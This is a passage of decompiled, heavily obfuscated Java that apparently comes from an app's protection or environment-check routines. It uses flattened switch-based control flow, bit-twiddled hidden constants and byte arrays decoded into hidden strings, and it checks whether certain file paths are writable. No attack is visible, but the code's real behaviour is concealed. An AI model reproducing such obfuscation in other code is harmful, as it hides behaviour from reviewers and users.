                    long j20 = (((((((((j18 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j18 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j18 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j18 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + (((((((((j19 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j19 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j19 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j19 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))));
                    long j21 = (j20 >>> 48) & 21845;
                    long j22 = ((j21 >>> 1) | j21) & 858993459;
                    long j23 = ((j22 >>> 2) | j22) & 252645135;
                    long j24 = (j20 >>> 32) & 21845;
                    long j25 = ((j24 >>> 1) | j24) & 858993459;
                    long j26 = ((j25 >>> 2) | j25) & 252645135;
                    long j27 = ((((j26 >>> 4) | j26) & 16711935) << 16) + ((((j23 >>> 4) | j23) & 16711935) << 24);
                    long j28 = (j20 >>> 16) & 21845;
                    long j29 = ((j28 >>> 1) | j28) & 858993459;
                    long j30 = ((j29 >>> 2) | j29) & 252645135;
                    long j31 = j20 & 21845;
                    long j32 = ((j31 >>> 1) | j31) & 858993459;
                    long j33 = ((j32 >>> 2) | j32) & 252645135;
                    bArr2[(int) ((((j33 >>> 4) | j33) & 16711935) + (((((j30 >>> 4) | j30) & 16711935) << 8) | j27))] = 108;
                    bArr2[1] = 29;
                    bArr2[2] = 35;
                    bArr2[3] = -90;
                    bArr2[4] = -109;
                    bArr2[5] = 27;
                    long j34 = 268468590;
                    long j35 = -1;
                    long j36 = ((((((((j34 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j34 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j34 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j34 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + (((((((((j35 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j35 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j35 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j35 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))));
                    long j37 = (j36 >>> 48) & 43690;
                    long j38 = ((j37 >>> 2) | (j37 >>> 1)) & 858993459;
                    long j39 = ((j38 >>> 2) | j38) & 252645135;
                    long j40 = (j36 >>> 32) & 43690;
                    long j41 = ((j40 >>> 2) | (j40 >>> 1)) & 858993459;
                    long j42 = ((j41 >>> 2) | j41) & 252645135;
                    long j43 = ((((j42 >>> 4) | j42) & 16711935) << 16) + ((((j39 >>> 4) | j39) & 16711935) << 24);
                    long j44 = (j36 >>> 16) & 43690;
                    long j45 = ((j44 >>> 2) | (j44 >>> 1)) & 858993459;
                    long j46 = ((j45 >>> 2) | j45) & 252645135;
                    long j47 = j36 & 43690;
                    long j48 = ((j47 >>> 2) | (j47 >>> 1)) & 858993459;
                    long j49 = ((j48 >>> 2) | j48) & 252645135;
                    bArr2[(((int) (((j49 | (j49 >>> 4)) & 16711935) | (((((j46 >>> 4) | j46) & 16711935) << 8) + j43))) + 9308161) ^ 277776745] = 31;
                    bArr2[7] = -123;
                    bArr2[8] = -97;
                    bArr2[9] = -79;
                    bArr2[10] = -28;
                    bArr2[11] = -67;
                    bArr2[12] = 1;
                    bArr2[13] = -37;
                    bArr2[14] = -76;
                    bArr2[15] = -35;
                    bArr2[16] = 87;
                    bArr2[17] = 63;
                    y(bArr, bArr2);
                    t(new String(bArr, StandardCharsets.UTF_8).intern(), str);
                    return true;
                case 192:
                    str = strArr[i];
                    if (new File(str).canWrite()) {
                        c5 = 40859;
                    } else {
                        c5 = 4613;
                    }
                case 63579:
                    return false;
                default:
                    c4 = 192;
                    c5 = c4;
            }
        }
    }

    /* JADX WARN: Failed to find 'out' block for switch in B:3:0x005e. Please report as an issue. */
    public final boolean P() {
        int i;
        int i3 = 0;
        char c4 = 27631;
        boolean z3 = false;
        while (true) {
            switch (c4) {
                case 56689:
                    byte[] bArr = {89, 16, 19, 79, -42, 68, -103, 65, -12, -62, -78, -13, -30, -87, 112, 20, 67, 34, 90};
                    k(bArr, new byte[]{-124, 63, 70, 42, 67, 2, -58, -50, -29, -68, -45, -96, 83, 85, -38, 55, 87, 99, 37});
                    Charset charset = StandardCharsets.UTF_8;
                    String intern = new String(bArr, charset).intern();
                    i = 0;
                    byte[] bArr2 = {26};
                    k(bArr2, new byte[]{33, 43, 36, -4, 90, 108, -19, 42});
                    if (!J(intern, new String(bArr2, charset).intern())) {
                        c4 = 10619;
                        i3 = i;
                    }
                    c4 = 1953;
                    i3 = i;
                case 27631:
                    long j2 = 541241485;
                    long j3 = 0;
                    long j4 = (((((j3 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845;
                    long j5 = (((((((j3 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16;
                    long j6 = j5 | j4;
                    long j7 = (((((((j3 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
                    long j8 = (((((((j3 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
                    long j9 = j8 + (j7 | j6);
                    long j10 = (((((((((j2 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j2 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j2 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j2 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + j9 + 6148914691236517205L;
                    long j11 = (j10 >>> 48) & 43690;
                    long j12 = ((j11 >>> 2) | (j11 >>> 1)) & 858993459;
                    long j13 = ((j12 >>> 2) | j12) & 252645135;
                    long j14 = (j10 >>> 32) & 43690;
                    long j15 = ((j14 >>> 2) | (j14 >>> 1)) & 858993459;
                    long j16 = ((j15 >>> 2) | j15) & 252645135;
                    long j17 = ((((j16 >>> 4) | j16) & 16711935) << 16) + ((((j13 >>> 4) | j13) & 16711935) << 24);
                    long j18 = (j10 >>> 16) & 43690;
                    long j19 = ((j18 >>> 2) | (j18 >>> 1)) & 858993459;
                    long j20 = ((j19 >>> 2) | j19) & 252645135;
                    long j21 = j10 & 43690;
                    long j22 = ((j21 >>> 2) | (j21 >>> 1)) & 858993459;
                    long j23 = ((j22 >>> 2) | j22) & 252645135;
                    byte b4 = 1454915639 ^ ((-1996157136) + ((int) ((((j23 >>> 4) | j23) & 16711935) | (((((j20 >>> 4) | j20) & 16711935) << 8) | j17))));
                    long j24 = -1;
                    long j25 = j8 | (j7 + j6);
                    long j26 = (((((j24 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845;
                    long j27 = (((((((j24 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16;
                    long j28 = j27 | j26;
                    long j29 = (((((((j24 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
                    long j30 = (((((((j24 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
                    long j31 = j30 + j29 + j28 + j25;
                    long j32 = (j31 >>> 48) & 21845;
                    long j33 = ((j32 >>> 1) | j32) & 858993459;
                    long j34 = ((j33 >>> 2) | j33) & 252645135;
                    long j35 = (j31 >>> 32) & 21845;
                    long j36 = ((j35 >>> 1) | j35) & 858993459;
                    long j37 = ((j36 >>> 2) | j36) & 252645135;
                    long j38 = ((((j37 >>> 4) | j37) & 16711935) << 16) + ((((j34 >>> 4) | j34) & 16711935) << 24);
                    long j39 = (j31 >>> 16) & 21845;
                    long j40 = ((j39 >>> 1) | j39) & 858993459;
                    long j41 = ((j40 >>> 2) | j40) & 252645135;
                    long j42 = j31 & 21845;
                    long j43 = ((j42 >>> 1) | j42) & 858993459;
                    long j44 = ((j43 >>> 2) | j43) & 252645135;
                    byte b5 = (((((int) ((((j44 >>> 4) | j44) & 16711935) + (((((j41 >>> 4) | j41) & 16711935) << 8) + j38))) | 502531838) & 26751620) - 1306509312) ^ (-1279757635);
                    long j45 = (j30 | j29 | j28) + j9;
                    long j46 = (j45 >>> 48) & 21845;
                    long j47 = ((j46 >>> 1) | j46) & 858993459;
                    long j48 = ((j47 >>> 2) | j47) & 252645135;
                    long j49 = (j45 >>> 32) & 21845;
                    long j50 = ((j49 >>> 1) | j49) & 858993459;
                    long j51 = ((j50 >>> 2) | j50) & 252645135;
                    long j52 = ((((j51 >>> 4) | j51) & 16711935) << 16) | ((((j48 >>> 4) | j48) & 16711935) << 24);
                    long j53 = (j45 >>> 16) & 21845;
                    long j54 = ((j53 >>> 1) | j53) & 858993459;
                    long j55 = ((j54 >>> 2) | j54) & 252645135;
                    long j56 = j45 & 21845;
                    long j57 = ((j56 >>> 1) | j56) & 858993459;
                    long j58 = ((j57 >>> 2) | j57) & 252645135;
                    long j59 = 1344285954;
                    long b6 = c3.b((((((((j59 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j59 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j59 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j59 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)), j8 | (j5 + j4 + j7), 6148914691236517205L);
                    long j60 = (b6 >>> 48) & 43690;
                    long j61 = ((j60 >>> 2) | (j60 >>> 1)) & 858993459;
                    long j62 = (j61 | (j61 >>> 2)) & 252645135;
                    long j63 = (b6 >>> 32) & 43690;
                    long j64 = ((j63 >>> 2) | (j63 >>> 1)) & 858993459;
                    long j65 = ((j64 >>> 2) | j64) & 252645135;
                    long j66 = ((((j65 >>> 4) | j65) & 16711935) << 16) + (((j62 | (j62 >>> 4)) & 16711935) << 24);
                    long j67 = (b6 >>> 16) & 43690;
                    long j68 = ((j67 >>> 2) | (j67 >>> 1)) & 858993459;
                    long j69 = ((j68 >>> 2) | j68) & 252645135;
                    long j70 = b6 & 43690;
                    long j71 = ((j70 >>> 2) | (j70 >>> 1)) & 858993459;
                    long j72 = (j71 | (j71 >>> 2)) & 252645135;
                    int i4 = ((((int) ((((j58 >>> 4) | j58) & 16711935) + ((((j55 >>> 4) | j55) & 16711935) << 8) + j52)) | (-1611742244)) & (-1995145192)) + ((int) (((j72 | (j72 >>> 4)) & 16711935) | ((((j69 >>> 4) | j69) & 16711935) << 8) | j66));
                    long j73 = -650859250;
                    long j74 = i4;
                    long j75 = (((((((((j73 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j73 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j73 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j73 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)))) + (((((((((j74 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j74 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j74 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j74 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)));
                    long j76 = (j75 >>> 48) & 21845;
                    long j77 = (j76 | (j76 >>> 1)) & 858993459;
                    long j78 = (j77 | (j77 >>> 2)) & 252645135;
                    long j79 = (j75 >>> 32) & 21845;
                    long j80 = ((j79 >>> 1) | j79) & 858993459;
                    long j81 = ((j80 >>> 2) | j80) & 252645135;
                    long j82 = (((j78 | (j78 >>> 4)) & 16711935) << 24) | ((((j81 >>> 4) | j81) & 16711935) << 16);
                    long j83 = (j75 >>> 16) & 21845;
                    long j84 = ((j83 >>> 1) | j83) & 858993459;
                    long j85 = ((j84 >>> 2) | j84) & 252645135;
                    long j86 = j75 & 21845;
                    long j87 = (j86 | (j86 >>> 1)) & 858993459;
                    long j88 = (j87 | (j87 >>> 2)) & 252645135;
                    byte[] bArr3 = {75, 55, -110, b4, 65, -102, 104, 57, 70, b5, (int) (((j88 | (j88 >>> 4)) & 16711935) | (((((j85 >>> 4) | j85) & 16711935) << 8) + j82)), -57, -42, 46, 100, -83, -58, -68, -36};
                    byte[] bArr4 = new byte[19];
                    bArr4[D.a(621314337, 3, -D1.a(621314337, 20672), 1) ^ 621335009] = -95;
                    bArr4[1] = -81;
                    bArr4[2] = -38;
                    bArr4[3] = -74;
                    bArr4[4] = -83;
                    bArr4[5] = -86;
                    bArr4[6] = -34;
                    bArr4[7] = 49;
                    bArr4[8] = -114;
                    bArr4[9] = -66;
                    bArr4[10] = -48;
                    bArr4[11] = 62;
                    bArr4[12] = -80;
                    bArr4[13] = 0;
                    bArr4[14] = -29;
                    bArr4[15] = Byte.MAX_VALUE;
                    bArr4[16] = -62;
                    bArr4[17] = -57;
                    long j89 = -1296620045;
                    long h2 = (((((((((j89 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j89 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((j89 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) | ((((((((j89 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16)))) + AbstractC0008a.h(j27, j26, j29, j30) + 6148914691236517205L;
                    long j90 = (h2 >>> 48) & 43690;
                    long j91 = ((j90 >>> 2) | (j90 >>> 1)) & 858993459;
                    long j92 = (j91 | (j91 >>> 2)) & 252645135;
                    long j93 = (h2 >>> 32) & 43690;
                    long j94 = ((j93 >>> 2) | (j93 >>> 1)) & 858993459;
                    long j95 = (j94 | (j94 >>> 2)) & 252645135;
                    long j96 = (((j92 | (j92 >>> 4)) & 16711935) << 24) | (((j95 | (j95 >>> 4)) & 16711935) << 16);
                    long j97 = (h2 >>> 16) & 43690;
                    long j98 = ((j97 >>> 2) | (j97 >>> 1)) & 858993459;
                    long j99 = (j98 | (j98 >>> 2)) & 252645135;
                    long j100 = (((j99 | (j99 >>> 4)) & 16711935) << 8) + j96;
                    long j101 = h2 & 43690;
                    long j102 = ((j101 >>> 2) | (j101 >>> 1)) & 858993459;
                    long j103 = (j102 | (j102 >>> 2)) & 252645135;
                    bArr4[18] = ((((int) (((j103 | (j103 >>> 4)) & 16711935) + j100)) & (-2146434643)) + 100992002) ^ 2045442662;
                    k(bArr3, bArr4);
                    Charset charset2 = StandardCharsets.UTF_8;
                    String intern2 = new String(bArr3, charset2).intern();
                    byte[] bArr5 = {30, -60, 38, 51, Byte.MAX_VALUE, 44, -13};
                    k(bArr5, new byte[]{-23, -105, 73, 15, -5, 119, 110, 23});
                    if (J(intern2, new String(bArr5, charset2).intern())) {
                        i = 0;
                        c4 = 1953;
                        i3 = i;
                    } else {
                        c4 = 45082;
                        i3 = 0;
                    }
                case 1953:
                    c4 = 13077;
                    z3 = true;
                case 10619:
                    c4 = 13077;
                    i3 = 0;
                    z3 = false;
                case 45082:
                    byte[] bArr6 = new byte[20];
                    bArr6[i3] = 43;
                    bArr6[1] = -57;
                    bArr6[2] = -124;
                    bArr6[3] = -23;
                    long j104 = -1826651659;
                    long j105 = -1;
                    long j106 = (((((j105 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845;
                    long j107 = (((((((j105 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16;
                    long j108 = j107 | j106;
                    long j109 = (((((((j105 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
                    long j110 = (((((((j105 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
                    long b7 = c3.b((((((((j104 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j104 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j104 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j104 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)), j110 | j109 | j108, 6148914691236517205L);
                    long j111 = (b7 >>> 48) & 43690;
                    long j112 = ((j111 >>> 2) | (j111 >>> 1)) & 858993459;
                    long j113 = ((j112 >>> 2) | j112) & 252645135;
                    long j114 = (b7 >>> 32) & 43690;
                    long j115 = ((j114 >>> 2) | (j114 >>> 1)) & 858993459;
                    long j116 = ((j115 >>> 2) | j115) & 252645135;
                    long j117 = ((((j116 >>> 4) | j116) & 16711935) << 16) + ((((j113 >>> 4) | j113) & 16711935) << 24);
                    long j118 = (b7 >>> 16) & 43690;
                    long j119 = ((j118 >>> 2) | (j118 >>> 1)) & 858993459;
                    long j120 = ((j119 >>> 2) | j119) & 252645135;
                    long j121 = b7 & 43690;
                    long j122 = ((j121 >>> 2) | (j121 >>> 1)) & 858993459;
                    long j123 = ((j122 >>> 2) | j122) & 252645135;
                    int i5 = -(((int) ((((j123 >>> 4) | j123) & 16711935) + ((((j120 >>> 4) | j120) & 16711935) << 8) + j117)) & 1821509216);
                    bArr6[V2.a(~i5, 1878720509, 1878720510 + i5) ^ (-57211290)] = -61;
                    bArr6[5] = -12;
                    bArr6[6] = -14;
                    bArr6[7] = 106;
                    bArr6[8] = -36;
                    bArr6[9] = 25;
                    bArr6[10] = -47;
                    bArr6[11] = 120;
                    bArr6[12] = 27;
                    bArr6[13] = -116;
                    bArr6[14] = -111;
                    long j124 = 1770321871;
                    long j125 = j109 + j108;
                    long j126 = (((((((((j124 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j124 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j124 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j124 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + (j110 | j125) + 6148914691236517205L;
                    long j127 = (j126 >>> 48) & 43690;
                    long j128 = ((j127 >>> 2) | (j127 >>> 1)) & 858993459;
                    long j129 = ((j128 >>> 2) | j128) & 252645135;
                    long j130 = (j126 >>> 32) & 43690;
                    long j131 = ((j130 >>> 2) | (j130 >>> 1)) & 858993459;
                    long j132 = ((j131 >>> 2) | j131) & 252645135;
                    long j133 = ((((j132 >>> 4) | j132) & 16711935) << 16) | ((((j129 >>> 4) | j129) & 16711935) << 24);
                    long j134 = (j126 >>> 16) & 43690;
                    long j135 = ((j134 >>> 2) | (j134 >>> 1)) & 858993459;
                    long j136 = ((j135 >>> 2) | j135) & 252645135;
                    long j137 = j126 & 43690;
                    long j138 = ((j137 >>> 2) | (j137 >>> 1)) & 858993459;
                    long j139 = ((j138 >>> 2) | j138) & 252645135;
                    bArr6[((((int) ((((j139 >>> 4) | j139) & 16711935) | (((((j136 >>> 4) | j136) & 16711935) << 8) + j133))) & 939623590) | 35920152) ^ 975543729] = -73;
                    bArr6[16] = -34;
                    bArr6[17] = 75;
                    bArr6[18] = 63;
                    bArr6[19] = 40;
                    k(bArr6, new byte[]{32, 27, -18, -118, 81, 115, 96, -92, 84, 48, 58, 59, 24, -72, -64, 110, -76, 37, 116, 86});
                    Charset charset3 = StandardCharsets.UTF_8;
                    String intern3 = new String(bArr6, charset3).intern();
                    byte[] bArr7 = {51, 94, -123, 66, -120, 36, -47};
                    byte[] bArr8 = new byte[8];
                    bArr8[i3] = 116;
                    long j140 = i3;
                    long j141 = (((((j140 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845;
                    long j142 = (((((((j140 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16;
                    long j143 = (((((((j140 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
                    long j144 = (((((((j140 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
                    long j145 = (j110 | j109 | (j107 + j106)) + (j144 | j143 | (j142 + j141));
                    long j146 = (j145 >>> 48) & 21845;
                    long j147 = ((j146 >>> 1) | j146) & 858993459;
                    long j148 = ((j147 >>> 2) | j147) & 252645135;
                    long j149 = (j145 >>> 32) & 21845;
                    long j150 = ((j149 >>> 1) | j149) & 858993459;
                    long j151 = ((j150 >>> 2) | j150) & 252645135;
                    long j152 = ((((j151 >>> 4) | j151) & 16711935) << 16) + ((((j148 >>> 4) | j148) & 16711935) << 24);
                    long j153 = (j145 >>> 16) & 21845;
                    long j154 = ((j153 >>> 1) | j153) & 858993459;
                    long j155 = ((j154 >>> 2) | j154) & 252645135;
                    long j156 = j145 & 21845;
                    long j157 = ((j156 >>> 1) | j156) & 858993459;
                    long j158 = ((j157 >>> 2) | j157) & 252645135;
                    long j159 = -1013907496;
                    long j160 = ((((int) ((((j158 >>> 4) | j158) & 16711935) + (((((j155 >>> 4) | j155) & 16711935) << 8) | j152))) | 395638594) & (-2096064952)) | 1082157457;
                    long j161 = (((((((((j159 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j159 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j159 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j159 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + ((((((((j160 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j160 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j160 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j160 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845));
                    long j162 = (j161 >>> 48) & 21845;
                    long j163 = ((j162 >>> 1) | j162) & 858993459;
                    long j164 = ((j163 >>> 2) | j163) & 252645135;
                    long j165 = (j161 >>> 32) & 21845;
                    long j166 = ((j165 >>> 1) | j165) & 858993459;
                    long j167 = ((j166 >>> 2) | j166) & 252645135;
                    long j168 = ((((j167 >>> 4) | j167) & 16711935) << 16) | ((((j164 >>> 4) | j164) & 16711935) << 24);
                    long j169 = (j161 >>> 16) & 21845;
                    long j170 = ((j169 >>> 1) | j169) & 858993459;
                    long j171 = ((j170 >>> 2) | j170) & 252645135;
                    long j172 = j161 & 21845;
                    long j173 = (j172 | (j172 >>> 1)) & 858993459;
                    long j174 = (j173 | (j173 >>> 2)) & 252645135;
                    int i6 = (int) (((j174 | (j174 >>> 4)) & 16711935) + ((((j171 >>> 4) | j171) & 16711935) << 8) + j168);
                    long j175 = 536953108;
                    long j176 = j142 | j141;
                    long b8 = c3.b((((((((j175 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j175 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j175 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j175 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845), j143 + j176 + j144, 6148914691236517205L);
                    long j177 = (b8 >>> 48) & 43690;
                    long j178 = ((j177 >>> 2) | (j177 >>> 1)) & 858993459;
                    long j179 = ((j178 >>> 2) | j178) & 252645135;
                    long j180 = (b8 >>> 32) & 43690;
                    long j181 = ((j180 >>> 2) | (j180 >>> 1)) & 858993459;
                    long j182 = ((j181 >>> 2) | j181) & 252645135;
                    long j183 = ((((j182 >>> 4) | j182) & 16711935) << 16) + ((((j179 >>> 4) | j179) & 16711935) << 24);
                    long j184 = (b8 >>> 16) & 43690;
                    long j185 = ((j184 >>> 2) | (j184 >>> 1)) & 858993459;
                    long j186 = ((j185 >>> 2) | j185) & 252645135;
                    long j187 = b8 & 43690;
                    long j188 = ((j187 >>> 2) | (j187 >>> 1)) & 858993459;
                    long j189 = ((j188 >>> 2) | j188) & 252645135;
                    bArr8[i6] = (-545769311) ^ (8816128 + ((int) ((((j189 >>> 4) | j189) & 16711935) | (((((j186 >>> 4) | j186) & 16711935) << 8) + j183))));
                    bArr8[2] = 65;
                    bArr8[3] = -8;
                    long j190 = -2113903582;
                    long j191 = ((((((((j190 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j190 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j190 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j190 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + j110 + j125;
                    long j192 = (j191 >>> 48) & 43690;
                    long j193 = ((j192 >>> 2) | (j192 >>> 1)) & 858993459;
                    long j194 = (j193 | (j193 >>> 2)) & 252645135;
                    long j195 = (j191 >>> 32) & 43690;
                    long j196 = ((j195 >>> 2) | (j195 >>> 1)) & 858993459;
                    long j197 = ((j196 >>> 2) | j196) & 252645135;
                    long j198 = (((j194 | (j194 >>> 4)) & 16711935) << 24) | ((((j197 >>> 4) | j197) & 16711935) << 16);
                    long j199 = (j191 >>> 16) & 43690;
                    long j200 = ((j199 >>> 2) | (j199 >>> 1)) & 858993459;
                    long j201 = ((j200 >>> 2) | j200) & 252645135;
                    long j202 = j191 & 43690;
                    long j203 = ((j202 >>> 2) | (j202 >>> 1)) & 858993459;
                    long j204 = (j203 | (j203 >>> 2)) & 252645135;
                    bArr8[4] = (((int) (((j204 | (j204 >>> 4)) & 16711935) | (((((j201 >>> 4) | j201) & 16711935) << 8) + j198))) + 269488773) ^ (-1844414827);
                    long j205 = 286392322;
                    long j206 = (((((((((j205 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j205 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j205 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j205 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + (j143 | j176 | j144);
                    long j207 = (j206 >>> 48) & 43690;
                    long j208 = ((j207 >>> 2) | (j207 >>> 1)) & 858993459;
                    long j209 = (j208 | (j208 >>> 2)) & 252645135;
                    long j210 = (j206 >>> 32) & 43690;
                    long j211 = ((j210 >>> 2) | (j210 >>> 1)) & 858993459;
                    long j212 = (j211 | (j211 >>> 2)) & 252645135;
                    long j213 = (((j212 | (j212 >>> 4)) & 16711935) << 16) + (((j209 | (j209 >>> 4)) & 16711935) << 24);
                    long j214 = (j206 >>> 16) & 43690;
                    long j215 = ((j214 >>> 2) | (j214 >>> 1)) & 858993459;
